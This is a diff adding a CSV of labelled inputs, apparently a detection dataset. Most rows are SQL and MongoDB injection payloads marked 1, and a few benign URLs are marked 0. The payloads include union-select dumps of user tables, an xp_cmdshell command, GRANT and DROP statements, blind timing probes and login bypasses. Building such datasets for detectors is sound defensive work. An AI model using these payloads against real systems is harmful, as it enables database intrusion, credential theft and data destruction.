@@ -1,0 +1,223 @@
+"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'",1
+"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(uname),3 from users",1
+"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()",1
+"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,database(),version()",1
+"http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,2,3",1
+http://testphp.vulnweb.com/artists.php?artist=1,0
+http://testphp.vulnweb.com,0
+; --,1
+'; --,1
+'); --,1
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
+' grant connect to name; grant resource to name; --,1
+' or 1=1 --,1
+' union (select @@version) --,1
+' union (select NULL, (select @@version)) --,1
+' union (select NULL, NULL, (select @@version)) --,1
+' union (select NULL, NULL, NULL,  (select @@version)) --,1
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --,1
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --,1
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --,1
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --,1
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --,1
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --,1
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --,1
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --,1
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --,1
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --,1
+1'1,1
+1 exec sp_ (or exec xp_),1
+1 and 1=1,1
+1' and 1=(select count(*) from tablenames); --,1
+1 or 1=1,1
+1' or '1'='1,1
+1or1=1,1
+1'or'1'='1,1
+fake@ema'or'il.nl'='il.nl,1
+1 and user_name() = 'dbo',1
+\'; desc users; --,1
+1\'1,1
+1' and non_existant_table = '1,1
+' or username is not NULL or username = ',1
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116,1
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --,1
+1 uni/**/on select all from where,1
+true, $where: '1 == 1',1
+, $where: '1 == 1',1
+$where: '1 == 1',1
+', $where: '1 == 1',1
+1, $where: '1 == 1',1
+{ $ne: 1 },1
+', $or: [ {}, { 'a':'a,1
+' } ], $comment:'successful MongoDB injection',1
+db.injection.insert({success:1});,1
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1,1
+|| 1==1,1
+' && this.password.match(/.*/)//+%00,1
+' && this.passwordzz.match(/.*/)//+%00,1
+'%20%26%26%20this.password.match(/.*/)//+%00,1
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00,1
+{$gt: ''},1
+[$ne]=1,1
+';sleep(5000);,1
+';sleep(5000);',1
+';sleep(5000);+',1
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,1
+ OR 1=1,1
+ OR 1=0,1
+ OR x=x,1
+ OR x=y,1
+ OR 1=1#,1
+ OR 1=0#,1
+ OR x=x#,1
+ OR x=y#,1
+ OR 1=1-- ,1
+ OR 1=0-- ,1
+ OR x=x-- ,1
+ OR x=y-- ,1
+ OR 3409=3409 AND ('pytW' LIKE 'pytW,1
+ OR 3409=3409 AND ('pytW' LIKE 'pytY,1
+ HAVING 1=1,1
+ HAVING 1=0,1
+ HAVING 1=1#,1
+ HAVING 1=0#,1
+ HAVING 1=1--,1 
+ HAVING 1=0--,1 
+ AND 1=1,1
+ AND 1=0,1
+ AND 1=1--,1 
+ AND 1=0--,1 
+ AND 1=1#,1
+ AND 1=0#,1
+ AND 1=1 AND '%'=',1
+ AND 1=0 AND '%'=',1
+ AND 1083=1083 AND (1427=1427,1
+ AND 7506=9091 AND (5913=5913,1
+ AND 1083=1083 AND ('1427=1427,1
+ AND 7506=9091 AND ('5913=5913,1
+ AND 7300=7300 AND 'pKlZ'='pKlZ,1
+ AND 7300=7300 AND 'pKlZ'='pKlY,1
+ AND 7300=7300 AND ('pKlZ'='pKlZ,1
+ AND 7300=7300 AND ('pKlZ'='pKlY,1
+ AS INJECTX WHERE 1=1 AND 1=1,1
+ AS INJECTX WHERE 1=1 AND 1=0,1
+ AS INJECTX WHERE 1=1 AND 1=1#,1
+ AS INJECTX WHERE 1=1 AND 1=0#,1
+ AS INJECTX WHERE 1=1 AND 1=1--,1
+ AS INJECTX WHERE 1=1 AND 1=0--,1
+ WHERE 1=1 AND 1=1,1
+ WHERE 1=1 AND 1=0,1
+ WHERE 1=1 AND 1=1#,1
+ WHERE 1=1 AND 1=0#,1
+ WHERE 1=1 AND 1=1--,1
+ WHERE 1=1 AND 1=0--,1
+ ORDER BY 1-- ,1
+ ORDER BY 2-- ,1
+ ORDER BY 3-- ,1
+ ORDER BY 4-- ,1
+ ORDER BY 5-- ,1
+ ORDER BY 6-- ,1
+ ORDER BY 7-- ,1
+ ORDER BY 8-- ,1
+ ORDER BY 9-- ,1
+ ORDER BY 10-- ,1
+ ORDER BY 11-- ,1
+ ORDER BY 12-- ,1
+ ORDER BY 13-- ,1
+ ORDER BY 14-- ,1
+ ORDER BY 15-- ,1
+ ORDER BY 16-- ,1
+ ORDER BY 17-- ,1
+ ORDER BY 18-- ,1
+ ORDER BY 19-- ,1
+ ORDER BY 20-- ,1
+ ORDER BY 21-- ,1
+ ORDER BY 22-- ,1
+ ORDER BY 23-- ,1
+ ORDER BY 24-- ,1
+ ORDER BY 25-- ,1
+ ORDER BY 26-- ,1
+ ORDER BY 27-- ,1
+ ORDER BY 28-- ,1
+ ORDER BY 29-- ,1
+ ORDER BY 30-- ,1
+ ORDER BY 31337--,1 
+ ORDER BY 1# ,1
+ ORDER BY 2# ,1
+ ORDER BY 3# ,1
+ ORDER BY 4# ,1
+ ORDER BY 5# ,1
+ ORDER BY 6# ,1
+ ORDER BY 7# ,1
+ ORDER BY 8# ,1
+ ORDER BY 9# ,1
+ ORDER BY 10# ,1
+ ORDER BY 11# ,1
+ ORDER BY 12# ,1
+ ORDER BY 13# ,1
+ ORDER BY 14# ,1
+ ORDER BY 15# ,1
+ ORDER BY 16# ,1
+ ORDER BY 17# ,1
+ ORDER BY 18# ,1
+ ORDER BY 19# ,1
+ ORDER BY 20# ,1
+ ORDER BY 21# ,1
+ ORDER BY 22# ,1
+ ORDER BY 23# ,1
+ ORDER BY 24# ,1
+ ORDER BY 25# ,1
+ ORDER BY 26#,1
+ ORDER BY 27#,1
+ ORDER BY 28#,1
+ ORDER BY 29#,1
+ ORDER BY 30#,1
+ ORDER BY 31337#,1
+ ORDER BY 1 ,1
+ ORDER BY 2 ,1
+ ORDER BY 3 ,1
+ ORDER BY 4 ,1
+ ORDER BY 5 ,1
+ ORDER BY 6 ,1
+ ORDER BY 7 ,1
+ ORDER BY 8 ,1
+ ORDER BY 9 ,1
+ ORDER BY 10 ,1
+ ORDER BY 11 ,1
+ ORDER BY 12 ,1
+ ORDER BY 13 ,1
+ ORDER BY 14 ,1
+ ORDER BY 15 ,1
+ ORDER BY 16 ,1
+ ORDER BY 17 ,1
+ ORDER BY 18 ,1
+ ORDER BY 19 ,1
+ ORDER BY 20 ,1
+ ORDER BY 21 ,1
+ ORDER BY 22 ,1
+ ORDER BY 23 ,1
+ ORDER BY 24 ,1
+ ORDER BY 25 ,1
+ ORDER BY 26 ,1
+ ORDER BY 27 ,1
+ ORDER BY 28 ,1
+ ORDER BY 29 ,1
+ ORDER BY 30 ,1
+ ORDER BY 31337 ,1
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',1
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,1
+%' AND 8310=8310 AND '%'=',1
+%' AND 8310=8311 AND '%'=',1
+ and (select substring(@@version,1,1))='X',1
+ and (select substring(@@version,1,1))='M',1
+ and (select substring(@@version,2,1))='i',1
+ and (select substring(@@version,2,1))='y',1
+ and (select substring(@@version,3,1))='c',1
+ and (select substring(@@version,3,1))='S',1
+ and (select substring(@@version,3,1))='X',1
+admin"-- -,1
+admin"--,1
+admin'-- -,1
+admin'--,1
